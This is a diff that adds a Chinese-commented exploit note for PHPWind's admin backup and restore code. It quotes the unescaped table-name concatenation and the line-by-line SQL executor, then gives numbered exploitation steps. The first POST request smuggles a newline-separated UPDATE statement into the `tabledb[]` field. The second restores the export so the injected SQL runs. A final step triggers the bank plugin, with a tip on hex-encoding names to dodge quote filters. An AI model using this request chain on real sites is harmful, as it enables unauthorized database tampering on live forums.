@@ -1,0 +1,42 @@
+// admin/target276.example.com:174-183 —— 表名裸拼接（$table 来自 $_POST['tabledb']）
+function bakuptable($tabledb){
+	global $db;
+	foreach($tabledb as $key=>$table){
+		$creattable.= "DROP TABLE IF EXISTS $table;\n";          // ★ $table 可控，含 \n 即插入独立 SQL 行
+		$CreatTable = $db->get_one("SHOW CREATE TABLE $table");
+		$CreatTable['Create Table']=str_replace($CreatTable['Table'],$table,$CreatTable['Create Table']);
+		$creattable.=$CreatTable['Create Table'].";\n\n";
+	}
+	return $creattable;
+}
+
+// admin/target276.example.com:185-216 —— 按行执行，每行以 ; 结尾即 query 一次（多语句）
+function bakindata($filename) {
+	global $db,$charset;
+	$sql=file($filename);
+	$query='';
+	foreach($sql as $key => $value){
+		$value=trim($value);
+		if(!$value || $value[0]=='#') continue;
+		if(eregi("\;$",$value)){                                  // ★ 行尾 ;
+			$query.=$value;
+			if(eregi("^CREATE",$query)){ /* ...重建表结构... */ }
+			elseif(eregi("^INSERT",$query)){ $query='REPLACE '.substr($query,6); }
+			$db->query($query);                                   // ★ 执行
+			$query='';
+		} else { $query.=$value; }
+	}
+}
+
+// admin/bakup.php:8-14, 50-64 —— bakout 分支：$pre 可控，写 data/<pre><f_num>.sql
+// admin/target276.example.com:90-115 —— bakin 分支：bakindata(D_P.'data/'.$pre.$step.'.sql'); 执行后 updatecache();
+
+// ---- 利用步骤（前置：$rightset['bakout'] 与 $rightset['bakin'] 均为 1）----
+// 1) POST /bbs/example.com?adminjob=bakup&verify=<v>   （注意：不带 admintype ⇒ 检查键为 bakup；带 admintype=bakout 则检查 bakout）
+//    body: action=bakout&step=0&sizelimit=1&tabledb[]=x%0AUPDATE+pw_hack+SET+hk_value=0+WHERE+hk_name=0x626b5f706572;&tabledb[]=pw_config
+//    （tabledb 元素含换行 ⇒ 导出文件里出现独立一行 `UPDATE pw_hack SET hk_value=0 WHERE hk_name=0x626b5f706572;;`）
+//    ⇒ 响应里会带出服务端生成的 $pre（$stop=1 分支 adminmsg('bakup_step', EncodeUrl($j_url)) 含 pre=）
+// 2) POST /bbs/example.com?adminjob=bakup&verify=<v> body: action=bakin&step=1&count=1&pre=<上一步的 pre>
+//    ⇒ bakindata 执行 data/<pre>1.sql ⇒ 任意 SQL 生效
+// 3) 回到目标业务页触发（例：PHPWind 银行插件 POST /bbs/example.com?H_name=bank 带 1=<payload>）
+// 注意：$table 里不要用引号（CheckVar 可能过滤），表名用 0x... 十六进制表达；bk_per 的 hex 为 0x626b5f706572
